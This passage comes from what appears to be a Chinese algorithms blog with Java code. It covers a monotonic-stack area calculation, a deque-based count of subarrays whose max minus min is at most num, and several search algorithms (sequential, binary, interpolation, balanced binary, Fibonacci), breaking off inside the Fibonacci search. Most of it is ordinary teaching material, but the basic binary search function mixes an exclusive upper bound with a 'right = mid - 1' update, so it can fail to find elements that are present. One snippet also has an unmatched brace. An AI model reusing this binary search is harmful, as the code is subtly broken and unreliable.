        <span class="token keyword">int</span> popLeftIndex <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 面积值: 左边肯定比自己小，但右边都是比自己大的</span>
        max <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span><span class="token punctuation">(</span>record<span class="token punctuation">.</span>length<span class="token operator">-</span>popLeftIndex<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>record<span class="token punctuation">[</span>popIndex<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> max<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="最大值减去最小值小于或等于num的子数组的数量（Max-Min-lt-Num-）（双端队列应用）"><a href="#最大值减去最小值小于或等于num的子数组的数量（Max-Min-lt-Num-）（双端队列应用）" class="headerlink" title="最大值减去最小值小于或等于num的子数组的数量（Max - Min &lt;= Num ）（双端队列应用）"></a>最大值减去最小值小于或等于num的子数组的数量（Max - Min &lt;= Num ）（双端队列应用）</h2><blockquote>
<p>如果数组长度为N，请实现O(N)的算法</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
   * 最大值减去最小值小于或等于num的子数组的数量
   *
   * @param arr
   * @param num
   * @return
   * 思路：子数组是多个，当在不断变化时，最大值与最小值也在不断的更新，所以我们应该用一种结构可以实时记录和更新数组中最大值和最小值
   * 这里我们可以想到上面的滑动窗口问题，当时是记录窗口内的最大值。所以这里我们使用两个滑动窗口，一个记录最大值，一个记录最小值
   * max(arr[i..j]) - min(arr[i...j]) &lt;= num ，如果从i-j每种子集都计算一遍，时间复杂度太高，我们可以找找特定的规律
   * - 如果max(arr[i..j]) - min(arr[i...j]) &lt;= num 成立，则arr[i...j]中每一个数组都满足条件,即arr[k...l] (i&lt;=k&lt;=l&lt;=j)
   * 我们用arr[i...j-1]举例， max[arr[i...j]] >= max[arr[i...j-1]]， 因为j如果j比i-(j-1)都大，则=成立，如果不是，则> 成立
   * - 如果上面情况不成立，则arr[k...l](k&lt;=i&lt;=j&lt;=l) 都不满足条件，这样我们就可以排除许多的可能
   */</span>
  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getNum</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> num<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token comment">// 记录最大值</span>
      <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> maxList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">// 记录最小值</span>
      <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> minList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
              <span class="token comment">// 这里if(false)的唯一可能就是，j在某点时，已经不能继续向前了，所以i开始向右偏移，看是否可以让条件重新满足</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span>minList<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> minList<span class="token punctuation">.</span><span class="token function">peekLast</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                  <span class="token comment">// 更新最小值</span>
                  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>minList<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>minList<span class="token punctuation">.</span><span class="token function">peekLast</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">>=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                      minList<span class="token punctuation">.</span><span class="token function">pollLast</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token punctuation">&#125;</span>
                  minList<span class="token punctuation">.</span><span class="token function">addLast</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token comment">// 更新最大值</span>
                  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>maxList<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>maxList<span class="token punctuation">.</span><span class="token function">peekLast</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                      maxList<span class="token punctuation">.</span><span class="token function">pollLast</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token punctuation">&#125;</span>
                  maxList<span class="token punctuation">.</span><span class="token function">addLast</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
              <span class="token comment">// 判断当前结果是否满足条件</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>maxList<span class="token punctuation">.</span><span class="token function">peekFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">-</span> arr<span class="token punctuation">[</span>minList<span class="token punctuation">.</span><span class="token function">peekFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> num<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                  <span class="token keyword">break</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
              j<span class="token operator">++</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          result <span class="token operator">+=</span> j <span class="token operator">-</span> i<span class="token punctuation">;</span>
          <span class="token comment">// 检查最大值和最小值是否过期，需要更新的</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>maxList<span class="token punctuation">.</span><span class="token function">peekFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
              maxList<span class="token punctuation">.</span><span class="token function">pollFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>minList<span class="token punctuation">.</span><span class="token function">peekFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
              minList<span class="token punctuation">.</span><span class="token function">pollFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          i<span class="token operator">++</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">return</span> result<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>栈</tag>
        <tag>队列</tag>
      </tags>
  </entry>
  <entry>
    <title>查找算法的演化过程</title>
    <url>//post/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95%E7%9A%84%E6%BC%94%E5%8C%96%E8%BF%87%E7%A8%8B.html</url>
    <content><![CDATA[<h1 id="查找算法的演化过程"><a href="#查找算法的演化过程" class="headerlink" title="查找算法的演化过程"></a>查找算法的演化过程</h1><h2 id="顺序查找"><a href="#顺序查找" class="headerlink" title="顺序查找"></a>顺序查找</h2><p>​        字面意思，一个个节点查找判断，对数据条件没什么要求，最简单，也最慢。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 顺序查找
 * @param arr    数组
 * @param target 目标值
 * @return 下标
 */</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 记录比较多少次找到目标值</span>
    <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        index<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"顺序查找次数："</span> <span class="token operator">+</span> index<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> i<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h2><p>​        如果我们能让数据有序，我们先找中间数，如果目标值大于中间数，则从中位数往后找，这一下子筛去一半的数据，如果刚好一样，则可以直接返回坐标。速度大幅提升。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 二分查找
 * @param arr    数组
 * @param target 目标值
 * @return 下标
 */</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getIndexBinary</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> left <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> right <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> right<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        index<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> midVal <span class="token operator">=</span> arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>midVal <span class="token operator">==</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"二分查找次数："</span> <span class="token operator">+</span> index<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> mid<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>midVal <span class="token operator">></span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            right <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="插值查找"><a href="#插值查找" class="headerlink" title="插值查找"></a>插值查找</h2><p>​        如果我的目标值很大，要查找的数组又很长，我知道目标值大概率是在数组的后面，但二分查找只能定位到中间位置，再往后筛选，能不能说我根据目标值的大小，推算出它的位置大概在哪里？如果不是再在剩下的范围找，比二分查找智能点儿。例如：我的数组存储从1到100，我要查询数组中是否有98这个数字。中间大概率是50左右，98肯定是在最后的区间内。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 插值查找
 * @param arr    数组
 * @param target 目标值
 * @return 下标
 */</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">interpolationSearch</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> high <span class="token operator">=</span> arr<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;=</span> high <span class="token operator">&amp;&amp;</span> target <span class="token operator">>=</span> arr<span class="token punctuation">[</span>low<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> target <span class="token operator">&lt;=</span> arr<span class="token punctuation">[</span>high<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        index<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token comment">// 与二分查找不同点在于中间点的确认 这里牵扯到了数学推理</span>
        <span class="token keyword">int</span> pos <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>target <span class="token operator">-</span> arr<span class="token punctuation">[</span>low<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>high<span class="token punctuation">]</span> <span class="token operator">-</span> arr<span class="token punctuation">[</span>low<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>pos<span class="token punctuation">]</span> <span class="token operator">==</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"插值查找的次数："</span> <span class="token operator">+</span> index<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> pos<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>pos<span class="token punctuation">]</span> <span class="token operator">&lt;</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            low <span class="token operator">=</span> pos <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            high <span class="token operator">=</span> pos <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="二分优化查找"><a href="#二分优化查找" class="headerlink" title="二分优化查找"></a>二分优化查找</h2><p>​        其实二分查找向左向右查找是不平衡的，也是说一边判断的次数要比另一边多，我们看图示例。</p>
<img src="https://img-blog.csdnimg.cn/20200422192747133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FDTV9Ob3ZpY2U=,size_16,color_FFFFFF,t_70" alt="img" style="zoom:80%;" />

<p>​        上图中第一行是所有的待查询的节点，然后不断二分查找，最后每个节点旁边灰色的数字就是找到该点时，判断过几次，下面是相应判断的代码。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">while</span><span class="token punctuation">(</span>low <span class="token operator">&lt;=</span> high<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>   <span class="token comment">//每步迭代可能都要做两次比较判断，有三个分支</span>
        <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">//以中点为轴点</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>target <span class="token operator">&lt;</span> <span class="token class-name">A</span><span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span>
            high <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">//深入前半段[low, mid-1]继续查找,这里只需要判断一次</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">A</span><span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">&lt;</span> target<span class="token punctuation">)</span>
            low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">//深入后半段[mid+1, high]继续查找,这里需要判断了两次</span>
        <span class="token keyword">else</span> 
            <span class="token keyword">return</span> mid<span class="token punctuation">;</span> <span class="token comment">//在mid处命中</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">//查找失败，返回-1</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​        可以看到如果不断向右查找，每次判断的次数都要比向左查找多一次判断。那能不能让向右向左都只判断一次。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 二分查找优化版本
 * @param arr    数组
 * @param target 目标值
 * @return 下标
 */</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getIndexBinaryPlus</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> high <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;</span> high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        index<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">//以中点为轴点，经比较后确定深入</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">&lt;</span> arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            high <span class="token operator">=</span> mid<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            low <span class="token operator">=</span> mid<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"二分查找优化："</span><span class="token operator">+</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>target <span class="token operator">==</span> arr<span class="token punctuation">[</span>low<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> low <span class="token operator">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">//返回命中元素所在的位置或-1</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​        我们再看一下查找的过程图：</p>
<p><img src="https://img-blog.csdnimg.cn/20200422193153347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FDTV9Ob3ZpY2U=,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>​        我们将之前二分查找比作方案A，现在版本比作方案B，我们可以看到对于最好情况，也就是中间数刚好是要找到数时，方案A可直接返回，方案B只能最后返回，但在方案B最好的情况下，要比方案A好，因为左右判断的次数是平衡的。</p>
<h2 id="斐波那契查找"><a href="#斐波那契查找" class="headerlink" title="斐波那契查找"></a>斐波那契查找</h2><p>​        我在学习斐波那契查找算法时，一直不理解，为啥按照黄金分割点做定点效果会更好，其中看到的一篇文章说，因为标准二分查找，向左向右查找并不平衡，所以如果每次定点向右偏移一些，这样可以让整体处于均衡的状态。也就是说我每次都向右偏移一些，这样向右查询的次数就会减少，像左查询次数增加，这样动态的形成一种均衡。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 斐波那契查找
 * @param arr    数组
 * @param target 目标值
 * @return 下标
 */</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">fibonacciSearch</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> high <span class="token operator">=</span> arr<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> mid<span class="token punctuation">;</span>
    <span class="token keyword">int</span> f<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">fib</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 找到扩容长度</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>high <span class="token operator">></span> f<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        k<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 扩容</span>
    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> temp <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">copyOf</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> f<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 最后一位填充</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> high <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> temp<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        temp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>high<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;=</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        mid <span class="token operator">=</span> low <span class="token operator">+</span> f<span class="token punctuation">[</span>k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">&lt;</span> temp<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            high <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
            k<span class="token operator">--</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">></span> temp<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
            k <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>mid <span class="token operator">&lt;=</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
